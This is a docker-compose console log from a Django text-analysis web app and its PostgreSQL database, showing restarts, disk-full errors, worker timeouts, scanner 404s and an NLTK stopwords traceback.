Attaching to cohvis_nginx_1, cohvis_web_1, cohvis_postgres_1
[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [1] [INFO] Starting gunicorn 19.3.0
[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
[32mpostgres_1  |[0m LOG:  shutting down
[32mpostgres_1  |[0m waiting for server to shut down....LOG:  database system is shut down
[32mpostgres_1  |[0m  done
[32mpostgres_1  |[0m server stopped
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m PostgreSQL init process complete; ready for start up.
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 07:51:39 UTC
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m LOG:  received smart shutdown request
[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
[32mpostgres_1  |[0m LOG:  shutting down
[32mpostgres_1  |[0m LOG:  database system is shut down
[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 07:52:45 UTC
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_12407.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_12407.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_12407.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
[33mweb_1       |[0m IOError: [Errno 2] No such file or directory: '/code/cohapp/coherenceanalyzer/temp/text'
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-05 10:11:34 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:10)
[33mweb_1       |[0m [2017-04-05 12:11:34 +0000] [10] [INFO] Worker exiting (pid: 10)
[33mweb_1       |[0m [2017-04-05 10:11:35 +0000] [31] [INFO] Booting worker with pid: 31
[33mweb_1       |[0m Not Found: /missing-admin-media-prefix/img/icon_calendar.gif
[33mweb_1       |[0m Not Found: /missing-admin-media-prefix/img/icon_clock.gif
[33mweb_1       |[0m Not Found: /missing-admin-media-prefix/img/icon_clock.gif
[33mweb_1       |[0m Not Found: /missing-admin-media-prefix/img/icon_calendar.gif
[33mweb_1       |[0m Not Found: /favicon.ico
[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
[33mweb_1       |[0m Not Found: /favicon.ico
[33mweb_1       |[0m Not Found: /login-experiment/er4qba52shp5yn6skran8xnwjjs5h27bwxscd2pj
[33mweb_1       |[0m Forbidden (CSRF token missing or incorrect.): /login-experiment/er4qba52shp5yn6skran8xnwjjs5h27bwxscd2pj
[33mweb_1       |[0m Not Found: /favicon.ico
[33mweb_1       |[0m Not Found: /missing-admin-media-prefix/img/icon_calendar.gif
[33mweb_1       |[0m Not Found: /admin/cohapp/subject/1/delete/
[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.baidu.com'. You may need to add u'www.baidu.com' to ALLOWED_HOSTS.
[33mweb_1       |[0m [2017-04-05 16:42:53 +0000] [1] [INFO] Handling signal: term
[33mweb_1       |[0m [2017-04-05 18:42:53 +0000] [8] [INFO] Worker exiting (pid: 8)
[33mweb_1       |[0m [2017-04-05 18:42:53 +0000] [31] [INFO] Worker exiting (pid: 31)
[33mweb_1       |[0m [2017-04-05 16:42:53 +0000] [1] [INFO] Shutting down: Master
[33mweb_1       |[0m [2017-04-05 16:46:37 +0000] [1] [INFO] Starting gunicorn 19.3.0
[33mweb_1       |[0m [2017-04-05 16:46:37 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
[33mweb_1       |[0m [2017-04-05 16:46:37 +0000] [1] [INFO] Using worker: sync
[33mweb_1       |[0m [2017-04-05 16:46:37 +0000] [8] [INFO] Booting worker with pid: 8
[33mweb_1       |[0m [2017-04-05 16:46:37 +0000] [10] [INFO] Booting worker with pid: 10
[33mweb_1       |[0m [2017-04-05 17:27:30 +0000] [1] [INFO] Handling signal: term
[33mweb_1       |[0m [2017-04-05 19:27:30 +0000] [8] [INFO] Worker exiting (pid: 8)
[33mweb_1       |[0m [2017-04-05 19:27:30 +0000] [10] [INFO] Worker exiting (pid: 10)
[33mweb_1       |[0m [2017-04-05 17:27:30 +0000] [1] [INFO] Shutting down: Master
[33mweb_1       |[0m [2017-04-05 17:33:36 +0000] [1] [INFO] Starting gunicorn 19.3.0
[33mweb_1       |[0m [2017-04-05 17:33:36 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
[33mweb_1       |[0m [2017-04-05 17:33:36 +0000] [1] [INFO] Using worker: sync
[33mweb_1       |[0m [2017-04-05 17:33:36 +0000] [8] [INFO] Booting worker with pid: 8
[33mweb_1       |[0m [2017-04-05 17:33:36 +0000] [10] [INFO] Booting worker with pid: 10
[33mweb_1       |[0m [2017-04-05 17:39:14 +0000] [1] [INFO] Starting gunicorn 19.3.0
[33mweb_1       |[0m [2017-04-05 17:39:14 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
[33mweb_1       |[0m [2017-04-05 17:39:14 +0000] [1] [INFO] Using worker: sync
[33mweb_1       |[0m [2017-04-05 17:39:14 +0000] [8] [INFO] Booting worker with pid: 8
[33mweb_1       |[0m [2017-04-05 17:39:14 +0000] [10] [INFO] Booting worker with pid: 10
[33mweb_1       |[0m Not Found: /favicon.ico
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-05 17:41:50 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:8)
[33mweb_1       |[0m [2017-04-05 19:41:50 +0000] [8] [INFO] Worker exiting (pid: 8)
[33mweb_1       |[0m [2017-04-05 17:41:51 +0000] [22] [INFO] Booting worker with pid: 22
[33mweb_1       |[0m Not Found: /setup.cgi
[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
[33mweb_1       |[0m [2017-04-05 18:46:39 +0000] [1] [INFO] Handling signal: term
[33mweb_1       |[0m [2017-04-05 20:46:39 +0000] [10] [INFO] Worker exiting (pid: 10)
[33mweb_1       |[0m [2017-04-05 20:46:39 +0000] [22] [INFO] Worker exiting (pid: 22)
[33mweb_1       |[0m [2017-04-05 18:46:39 +0000] [1] [INFO] Shutting down: Master
[33mweb_1       |[0m [2017-04-05 18:47:27 +0000] [1] [INFO] Starting gunicorn 19.3.0
[33mweb_1       |[0m [2017-04-05 18:47:27 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
[33mweb_1       |[0m [2017-04-05 18:47:27 +0000] [1] [INFO] Using worker: sync
[33mweb_1       |[0m [2017-04-05 18:47:27 +0000] [8] [INFO] Booting worker with pid: 8
[33mweb_1       |[0m [2017-04-05 18:47:27 +0000] [10] [INFO] Booting worker with pid: 10
[33mweb_1       |[0m Not Found: /setup.cgi
[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
[33mweb_1       |[0m Not Found: /hndUnblock.cgi
[33mweb_1       |[0m Not Found: /tmUnblock.cgi
[33mweb_1       |[0m Not Found: /cgi
[33mweb_1       |[0m Not Found: /cgi-bin/cgiSrv.cgi
[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_12407.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  received smart shutdown request
[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
[32mpostgres_1  |[0m FATAL:  terminating autovacuum process due to administrator command
[32mpostgres_1  |[0m LOG:  shutting down
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat/db_12407.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat/db_0.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat/global.tmp": No space left on device
[32mpostgres_1  |[0m LOG:  database system is shut down
[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 08:55:53 UTC
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m LOG:  received smart shutdown request
[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
[32mpostgres_1  |[0m LOG:  shutting down
[32mpostgres_1  |[0m LOG:  database system is shut down
[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 09:06:36 UTC
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
[33mweb_1       |[0m Not Found: /setup.cgi
[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
[33mweb_1       |[0m Not Found: /favicon.ico
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m Internal Server Error: /apis/textanalyzer/
[33mweb_1       |[0m Traceback (most recent call last):
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/exception.py", line 39, in inner
[33mweb_1       |[0m     response = get_response(request)
[32mpostgres_1  |[0m LOG:  received smart shutdown request
[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
[32mpostgres_1  |[0m LOG:  shutting down
[32mpostgres_1  |[0m LOG:  database system is shut down
[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 09:33:37 UTC
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m LOG:  received smart shutdown request
[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
[32mpostgres_1  |[0m LOG:  shutting down
[32mpostgres_1  |[0m LOG:  database system is shut down
[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 09:58:50 UTC
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m FATAL:  role "christianb" does not exist
[32mpostgres_1  |[0m ERROR:  relation "auth_user" does not exist at character 280
[32mpostgres_1  |[0m STATEMENT:  SELECT "auth_user"."id", "auth_user"."password", "auth_user"."last_login", "auth_user"."is_superuser", "auth_user"."username", "auth_user"."first_name", "auth_user"."last_name", "auth_user"."email", "auth_user"."is_staff", "auth_user"."is_active", "auth_user"."date_joined" FROM "auth_user" WHERE "auth_user"."username" = 'root'
[32mpostgres_1  |[0m LOG:  received smart shutdown request
[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
[32mpostgres_1  |[0m LOG:  shutting down
[32mpostgres_1  |[0m LOG:  database system is shut down
[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 10:09:42 UTC
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m LOG:  received smart shutdown request
[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
[32mpostgres_1  |[0m LOG:  shutting down
[32mpostgres_1  |[0m LOG:  database system is shut down
[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 16:42:53 UTC
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m LOG:  received smart shutdown request
[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
[32mpostgres_1  |[0m LOG:  shutting down
[32mpostgres_1  |[0m LOG:  database system is shut down
[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 17:27:30 UTC
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
[32mpostgres_1  |[0m LOG:  incomplete startup packet
[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-05 17:33:35 UTC
[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
[32mpostgres_1  |[0m LOG:  invalid record length at 0/15E9938: wanted 24, got 0
[32mpostgres_1  |[0m LOG:  redo is not required
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m LOG:  received smart shutdown request
[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
[32mpostgres_1  |[0m LOG:  shutting down
[32mpostgres_1  |[0m LOG:  database system is shut down
[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 18:46:40 UTC
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
[32mpostgres_1  |[0m LOG:  incomplete startup packet
[32mpostgres_1  |[0m FATAL:  database "template0" is not currently accepting connections
[32mpostgres_1  |[0m FATAL:  database "-h" does not exist
[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
[32mpostgres_1  |[0m LOG:  incomplete startup packet
[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
[32mpostgres_1  |[0m LOG:  incomplete startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m FATAL:  unsupported frontend protocol 65363.19778: server supports 1.0 to 3.0
[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
[32mpostgres_1  |[0m LOG:  incomplete startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m FATAL:  unsupported frontend protocol 65363.19778: server supports 1.0 to 3.0
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
[32mpostgres_1  |[0m LOG:  incomplete startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m FATAL:  unsupported frontend protocol 27265.28208: server supports 1.0 to 3.0
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 249, in _legacy_get_response
[33mweb_1       |[0m     response = self._get_response(request)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 187, in _get_response
[33mweb_1       |[0m     response = self.process_exception_by_middleware(e, request)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 185, in _get_response
[33mweb_1       |[0m     response = wrapped_callback(request, *callback_args, **callback_kwargs)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/views/decorators/csrf.py", line 58, in wrapped_view
[33mweb_1       |[0m     return view_func(*args, **kwargs)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/views/generic/base.py", line 68, in view
[33mweb_1       |[0m     return self.dispatch(request, *args, **kwargs)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 483, in dispatch
[33mweb_1       |[0m     response = self.handle_exception(exc)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 443, in handle_exception
[33mweb_1       |[0m     self.raise_uncaught_exception(exc)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 480, in dispatch
[33mweb_1       |[0m     response = handler(request, *args, **kwargs)
[33mweb_1       |[0m   File "/code/cohapp/apis.py", line 470, in post
[33mweb_1       |[0m     analyzer = analyzeTextCohesion(text)
[33mweb_1       |[0m   File "/code/cohapp/coherenceanalyzer/coherenceanalyzer.py", line 724, in analyzeTextCohesion
[33mweb_1       |[0m     stem_relations = get_stem_relations(sentences, gn)
[33mweb_1       |[0m   File "/code/cohapp/coherenceanalyzer/coherenceanalyzer.py", line 314, in get_stem_relations
[33mweb_1       |[0m     stemmer = GermanStemmer(ignore_stopwords=True)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/nltk/stem/snowball.py", line 120, in __init__
[33mweb_1       |[0m     for word in stopwords.words(language):
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/nltk/corpus/util.py", line 116, in __getattr__
[33mweb_1       |[0m     self.__load()
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/nltk/corpus/util.py", line 81, in __load
[33mweb_1       |[0m     except LookupError: raise e
[33mweb_1       |[0m LookupError: 
[33mweb_1       |[0m **********************************************************************
